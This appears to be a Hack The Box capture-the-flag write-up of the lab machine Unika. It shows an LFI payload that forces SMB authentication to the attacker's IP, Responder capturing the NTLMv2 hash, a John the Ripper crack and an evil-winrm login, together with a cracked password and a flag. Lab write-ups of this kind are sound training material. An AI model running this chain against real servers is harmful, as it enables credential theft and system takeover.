🚩 HTB: Unika - Tier 1
Date: 2026-01-15

Machine Type: Windows

Difficulty: Very Easy

Vulnerability: LFI (Local File Inclusion) & NTLM Hash Capture

OWASP Top 10: A06:2021-Vulnerable and Outdated Components

🔍 1. Enumeration
Nmap Scan
The process started with a service and version detection scan to identify open ports:

Bash

nmap -sC -sV <TARGET_IP>
Port 80 (HTTP): Open, running Apache httpd 2.4.38.

Discovery: The scan confirmed a web service. Accessing the IP redirected me to unika.htb, which I added to my /etc/hosts file.

🛡️ 2. Web Analysis
Upon navigating to http://unika.htb, I discovered a PHP-based website.

Parameter Found: The URL used a ?page= parameter to load different language files (e.g., index.php?page=english.html).

Vulnerability: Testing for Local File Inclusion (LFI) confirmed that the application was not sanitizing this input, allowing me to point the server to external paths.

🚀 3. Exploitation (NTLM Poisoning)
The goal was to capture the service account's NTLM hash. I used the LFI vulnerability to force the server to attempt an SMB connection to my attacker machine.

Step 1: Start Responder
I initiated Responder to listen for authentication attempts on my network interface:

Bash

sudo responder -I tun0
Step 2: Trigger Authentication
I navigated to the following URL, replacing <MY_IP> with my HTB VPN IP: http://unika.htb/index.php?page=//<MY_IP>/somefile

Step 3: Hash Cracking
Responder successfully captured the NTLMv2 hash for the user Administrator. I saved this hash to a file and used John the Ripper:

Bash

john --wordlist=rockyou.txt hash.txt
Cracked Password: badminton

🚩 4. Capture The Flag
Using the recovered credentials, I accessed the machine remotely via WinRM (Port 5985).

evil-winrm -i <TARGET_IP> -u administrator -p badminton
Accessing Flag:

Path: C:\Users\Administrator\Desktop\root.txt

Root Flag: ea81b7afddd03efaa0945333ed147fac

🧠 5. Key Learnings
LFI to SMB: Learned how an LFI vulnerability in a Windows environment can be turned into an NTLM hash capture attack.

Responder Utility: Mastered the use of the -I flag to specify the network interface for poisoning.

WinRM Exploitation: Used evil-winrm to gain a full PowerShell shell on a remote Windows target using port 5985.
